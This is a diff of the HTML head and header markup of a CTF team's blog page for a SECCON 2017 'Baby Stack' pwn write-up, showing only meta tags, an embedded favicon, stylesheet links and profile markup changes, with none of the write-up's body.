@@ -1,7 +1,8 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang=en>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
+  
   <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
   <meta name="renderer" content="webkit">
@@ -15,14 +16,15 @@
   <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
   <meta http-equiv="window-target" content="_top">
   
+  
   <title>[Pwn] SECCON - Baby Stack | TeamRocketIST - Portuguese CTF Team</title>
-  <meta name="description" content="Baby StackCan you do a traditional stack attack?Host : baby_stack.pwn.seccon.jpPort : 15285baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8  Overflow the BufferWe have a go">
+  <meta name="description" content="Baby Stack Can you do a traditional stack attack? Host : baby_stack.pwn.seccon.jp Port : 15285 baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8   Overflow the Buffer We hav">
 <meta name="keywords" content="rop,stack_overflow,pwn,go,statically_linked,seccon2017">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[Pwn] SECCON - Baby Stack">
 <meta property="og:url" content="https://teamrocketist.github.io/2017/12/13/Pwn-SECCON-Baby-Stack/index.html">
 <meta property="og:site_name" content="TEAMROCKETIST">
-<meta property="og:description" content="Baby StackCan you do a traditional stack attack?Host : baby_stack.pwn.seccon.jpPort : 15285baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8  Overflow the BufferWe have a go">
+<meta property="og:description" content="Baby Stack Can you do a traditional stack attack? Host : baby_stack.pwn.seccon.jp Port : 15285 baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8   Overflow the Buffer We hav">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https://i.imgur.com/0kyUAPc.png">
 <meta property="og:image" content="https://i.imgur.com/HEuxv0i.png">
@@ -30,36 +32,39 @@
 <meta property="og:updated_time" content="2022-08-23T00:14:55.165Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[Pwn] SECCON - Baby Stack">
-<meta name="twitter:description" content="Baby StackCan you do a traditional stack attack?Host : baby_stack.pwn.seccon.jpPort : 15285baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8  Overflow the BufferWe have a go">
+<meta name="twitter:description" content="Baby Stack Can you do a traditional stack attack? Host : baby_stack.pwn.seccon.jp Port : 15285 baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8   Overflow the Buffer We hav">
 <meta name="twitter:image" content="https://i.imgur.com/0kyUAPc.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="https://teamrocketist.github.io/2017/12/13/Pwn-SECCON-Baby-Stack/index.html">
   
     <link rel="alternate" href="/atom.xml" title="TEAMROCKETIST" type="application/atom+xml">
   
   
     <link rel="icon" href="data:image/vnd.microsoft.icon;base64,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" type="image/x-icon">
   
-  <!-- font-awesome CSS -->
-  <link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
-  
-  <link rel="stylesheet" href="/css/jquery.fancybox.min.css">
-
   <link rel="stylesheet" href="/css/style.css">
+  
+  
+  
+    <link href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.css" rel="stylesheet">
+  
+  
 </head>
-</html>
 
-<body class="main-center">
-  <section class="mainside">
+
+<body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
   <div class="slimContent">
     <div class="navbar-header">
       
       
       <div class="profile-block text-center">
         <a id="avatar" href="https://github.com/teamrocketist" target="_blank">
-          <img class="thumb-xl img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
         </a>
         <h2 id="name" class="hidden-xs hidden-sm">TeamRocketIST</h2>
         <h3 id="title" class="hidden-xs hidden-sm hidden-md">CTF Team</h3>
-        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="fa fa-map-marker"></i> Lisbon, Portugal</small>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Lisbon, Portugal</small>
